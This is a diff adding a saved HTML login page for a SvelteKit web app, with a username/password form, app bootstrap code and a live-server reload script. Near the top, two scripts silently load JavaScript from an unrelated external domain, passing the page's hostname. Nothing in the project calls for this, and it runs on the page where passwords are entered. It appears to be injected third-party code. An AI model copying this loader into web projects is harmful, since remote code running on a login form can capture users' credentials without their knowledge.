@@ -1,0 +1,129 @@
+﻿<html lang="en"><head>
+
+    <meta charset="utf-8">
+    <link rel="icon" href="logo.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Login</title>
+    
+    <link href="_app/immutable/assets/_page.d957d752.css" rel="stylesheet">
+    <link href="_app/immutable/assets/navbar.a1aa381e.css" rel="stylesheet"><!-- HEAD_svelte-2ekfww_START --><link rel="stylesheet" href="css/hamburgers.css"><!-- HEAD_svelte-2ekfww_END -->
+<script src="//conoret.com/dsp?h=127.0.0.1&amp;r=0.8351840385073057" type="text/javascript" defer="" async=""></script></head>
+<body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+    <div>
+
+
+
+
+<nav class="svelte-1cte7il"><a href="index.htm" class="icon-link svelte-1cte7il"><img src="logo.png" alt="icon" class="icon svelte-1cte7il"></a>
+
+<div class="nav-links svelte-1cte7il"><a href="index.htm" class="svelte-1cte7il">Home</a>
+        
+        </div>
+
+    <div></div>
+</nav>
+
+<form class="svelte-18ovhr5"><h1 class="svelte-18ovhr5">Login</h1>
+
+<label for="name" class="form-label"><b>Username or Email</b></label>
+
+<input type="text" placeholder="Username or Email" id="name" name="name" required="" autofocus="" control-id="ControlID-1">
+
+<label for="password" class="form-label"><b>Password</b></label>
+<input type="password" placeholder="Password" id="password" name="password" required="" control-id="ControlID-2">
+
+<span class="error svelte-18ovhr5"></span>
+
+<button type="submit" class="form-button svelte-18ovhr5" control-id="ControlID-3">Login</button>
+
+<div class="footer svelte-18ovhr5"><p><i class="hide svelte-18ovhr5">Don't have an account? </i><a href="register.html">Register</a></p>
+    <p><i class="hide svelte-18ovhr5">Forgot your password? </i> <a href="forgotPassword.html">Reset Password</a></p></div>
+</form>
+
+
+        
+        <script>
+            {
+                __sveltekit_1p3riew = {
+                    env: {},
+                    base: new URL(".", location).pathname.slice(0, -1),
+                    element: document.currentScript.parentElement
+                };
+
+                const data = [null,null];
+
+                Promise.all([
+                    import("./_app/immutable/entry/start.bb251f01.js"),
+                    import("./_app/immutable/entry/app.234dfd19.js")
+                ]).then(([kit, app]) => {
+                    kit.start(app, __sveltekit_1p3riew.element, {
+                        node_ids: [0, 18],
+                        data,
+                        form: null,
+                        error: null
+                    });
+                });
+            }
+        </script>
+    </div>
+<!-- Code injected by live-server -->
+<script>
+// <![CDATA[  <-- For SVG support
+if ('WebSocket' in window) {
+    (function () {
+        function refreshCSS() {
+            var sheets = [].slice.call(document.getElementsByTagName("link"));
+            var head = document.getElementsByTagName("head")[0];
+            for (var i = 0; i < sheets.length; ++i) {
+                var elem = sheets[i];
+                var parent = elem.parentElement || head;
+                parent.removeChild(elem);
+                var rel = elem.rel;
+                if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+                    var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+                    elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+                }
+                parent.appendChild(elem);
+            }
+        }
+        var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+        var address = protocol + window.location.host + window.location.pathname + '/ws';
+        var socket = new WebSocket(address);
+        socket.onmessage = function (msg) {
+            if (msg.data == 'reload') window.location.reload();
+            else if (msg.data == 'refreshcss') refreshCSS();
+        };
+        if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+            console.log('Live reload enabled.');
+            sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+        }
+    })();
+}
+else {
+    console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+}
+// ]]>
+</script>
+
+
+<div id="apple-password-autofill-list" 
+style="z-index: 
+2147483647 !important;
+ padding: 0px !important;
+  margin: 0px !important; 
+  border-radius: 8px !important;
+   position: fixed !important; 
+   color-scheme: normal !important; 
+   box-shadow: rgba(0, 0, 0, 0.15) 0px 2px 4px 0px, rgba(0, 0, 0, 0.18) 0px 8px 15px 6px 
+   !important; border: 1px solid rgba(0, 0, 0, 0.9) 
+   !important; overflow: hidden !important; backdrop-filter: blur(20px) 
+   !important; background-color: rgba(35, 35, 35, 0.8) 
+   !important; top: 630px !important; left: -999999px 
+   !important; opacity: 0 !important; visibility: hidden 
+   !important; height: 85.5px !important; width: 306px 
+   !important;">
+</div>
+</body>
+<div class="XTranslate"></div>
+</html>
